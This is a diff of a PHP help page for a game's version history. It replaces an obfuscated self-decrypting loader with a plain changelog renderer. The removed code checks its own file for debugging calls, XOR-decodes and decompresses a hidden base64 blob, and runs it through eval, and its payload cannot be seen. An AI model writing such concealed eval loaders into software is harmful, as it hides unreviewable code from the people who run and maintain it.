@@ -1,24 +1,80 @@
 <?php
-$upehhtu="a317e4ff8352d5168657439924aceb80";
-$oinvpd="55075753540756005b010d0a055005010c0e010357520d5a5650505b00040107";
-$fyvokdx="TO7TMepd6yBzT99vLXE3g7ZwgD94ZxApIjUOjBwuuDH5vwdsWt2guhuLg9jPcZ96ip47zePDa4N7j8GabkOzRW+jtueJCEOAr64BahkIZtQxOUjwv2uZT1Sh0G+m/3o8C5ZSlGDTV/b5Q9wohl+3QCtGStv+HYY5qWhCESkGD4zN3fG9PbXQYaBTycEgzmwTdawGocO1/dNsk/bmrJy95VrboPq50gRwcVXAEM3WkyzoRitKlOGqJSod/Am3epKLMOlKtvuSWgDcN6/30FrCiU7vZxsvrpMm7ytOaT5u5owNp4RTx8edXmsxgs0jVhlu0zQAkCeH3aw4ICsAZw29ZEoCgSgMTlNw97R3ArCmBAdn9z+ZOCuo9dDnBsgkAn8VoLNwBqywe3dBHx0LN7kjYCyBRtgM4wYK3MxFIBUSdX9vu8YcA6UXJG7cjUtbfvWSTSSb240U+lJ7pYhBYc2c18TO7DuvrPU9Qh5CcBNYY0t0PAAx3O8b85XvG9zOsZVY0y1zOF/mB+oQkyoSE9NpDa7fgnRQO6RrnYITHjRgpmYQnX11cPoL34NF6eE00T2mEPiUKL/pUs/U99QQsBKL8oGRJnACRfXdAnT8z58kjOLAP0DOs2HSoX6tp2X5jFxbqWg10Cd20p5x/U9NfF1ZLe4OTz3gG9/f9O80fPc/At7hQAqttjq1H8zo84jRWSCJ9/SM0Yqnap6abJ+fjoRdv8OctB33hT2W5LQkKzPiRWFZxTIgxqQSJx0ourdJLFicIKQTKll5ydQ6gXGI693B3GrED6wvR9S8xCGE6BdHCz3kJKZpHzvlcswMRMEj6/+6gsPNW5TzyV3YRv2gdJNEHRGpm8WfB94ztazMNprKd9ICf9vYKQ6rLRcmnlJojX9gCxOYOY6OqSWh3t2vY7RfAHgxoWrPp2RUMMraIfRplhCkjio+sqJQ9Lf9cSwj2MGqRCq9EsKy+4yh9SNLvHvp4WZtIFz9Ze1yvL2Pi+f21jfLKpPQLkD7x+Hu5vSjId4uQEGdCIlGkO44Ufq4l9/5T08e6izCn3u5VSdM5OYEZQw/nWvOY1aY2KE6RKehakRpydPYYMvuO06wyvoTFIydNKEOKhldy8+jFB3UhbsaG1GAX6/ZHFHoKP6KbiGK3sDJBdhXdy8DUhs/y5Ltwh68MF3VEmCGnzKlf1tk";
-$gwaluse=file_get_contents(__FILE__);
-$fpxvsdi=str_replace($fyvokdx,"",$gwaluse);
-if(strpos($fpxvsdi,"ec"."ho")!==false||strpos($fpxvsdi,"pr"."int")!==false||strpos($fpxvsdi,"var_"."dump")!==false||strpos($fpxvsdi,"file_put_"."contents")!==false||strpos($fpxvsdi,"fw"."rite")!==false){die();}
-$wlbcxdx=str_replace(array($upehhtu,$oinvpd),array("SP_1bc3167d","KP_36f4a050"),$gwaluse);
-$bfaexnaodg=md5($wlbcxdx);
-$nzopevxgg=hex2bin($oinvpd);
-$vriopwxomh="";
-$hpqmifkaq=strlen($bfaexnaodg);
-for($yplgfbbm=0;$yplgfbbm<$hpqmifkaq;$yplgfbbm++){
-$vriopwxomh.=chr(ord($nzopevxgg[$yplgfbbm])^ord($bfaexnaodg[$yplgfbbm]));
+// Versions and Updates Help View loaded from JSON
+$json_path = __DIR__ . '/../../Config/changelog.json';
+$changelog = [];
+if (file_exists($json_path)) {
+    $changelog = json_decode(file_get_contents($json_path), true);
 }
-$lfehocqsln=base64_decode($fyvokdx);
-$cjineizjj=strlen($lfehocqsln);
-$rewjrfgq="";
-$jezvjm=strlen($vriopwxomh);
-for($yplgfbbm=0;$yplgfbbm<$cjineizjj;$yplgfbbm++){
-$rewjrfgq.=$lfehocqsln[$yplgfbbm]^$vriopwxomh[$yplgfbbm%$jezvjm];
-}
-$wozqrnnf="gzun"."compress";
-eval('?>' . $wozqrnnf($rewjrfgq) . '<?php ');
+?>
+<h1>Versões e Atualizações</h1>
+<p>Confira o histórico de atualizações e mudanças no jogo.</p>
+
+<style>
+    /* Simple styles for the collapsible sections */
+    .version-details {
+        margin-bottom: 5px;
+        border: 1px solid #7d510f;
+        background-color: #f4ead4;
+    }
+
+    .version-summary {
+        padding: 10px;
+        cursor: pointer;
+        font-weight: bold;
+        background-color: #e2c07c;
+        list-style: none;
+    }
+
+    .version-summary:hover {
+        background-color: #cfaa7d;
+    }
+
+    .version-summary::-webkit-details-marker {
+        display: none;
+    }
+
+    .version-content {
+        padding: 15px;
+        background-color: #fff5e1;
+        border-top: 1px solid #cfaa7d;
+    }
+</style>
+
+<div class="versions-container">
+    <?php if (empty($changelog)): ?>
+        <p>Nenhuma atualização registada.</p>
+    <?php else: ?>
+        <?php foreach ($changelog as $entry): ?>
+            <?php if ($entry['version'] === 'Desenvolvimento / Development' || strpos($entry['version'], 'Desenvolvimento') !== false): ?>
+                <div class="version-content" style="border: 1px solid #7d510f; background-color: #fff5e1; margin-bottom: 5px; padding: 15px;">
+                    <?php if (!empty($entry['sections'])): ?>
+                        <?php foreach ($entry['sections'] as $sec): ?>
+                            <h4 style="margin-top: 0;"><?= htmlspecialchars($sec['title']) ?></h4>
+                            <ul>
+                                <?php foreach ($sec['items'] as $item): ?>
+                                    <li><?= htmlspecialchars($item) ?></li>
+                                <?php endforeach; ?>
+                            </ul>
+                        <?php endforeach; ?>
+                    <?php endif; ?>
+                </div>
+            <?php else: ?>
+                <details class="version-details" <?= !empty($entry['open']) ? 'open' : '' ?>>
+                    <summary class="version-summary"><?= htmlspecialchars($entry['version']) ?></summary>
+                    <div class="version-content">
+                        <?php if (!empty($entry['sections'])): ?>
+                            <?php foreach ($entry['sections'] as $sec): ?>
+                                <h4><?= htmlspecialchars($sec['title']) ?></h4>
+                                <ul>
+                                    <?php foreach ($sec['items'] as $item): ?>
+                                        <li><?= htmlspecialchars($item) ?></li>
+                                    <?php endforeach; ?>
+                                </ul>
+                            <?php endforeach; ?>
+                        <?php endif; ?>
+                    </div>
+                </details>
+            <?php endif; ?>
+        <?php endforeach; ?>
+    <?php endif; ?>
+</div>
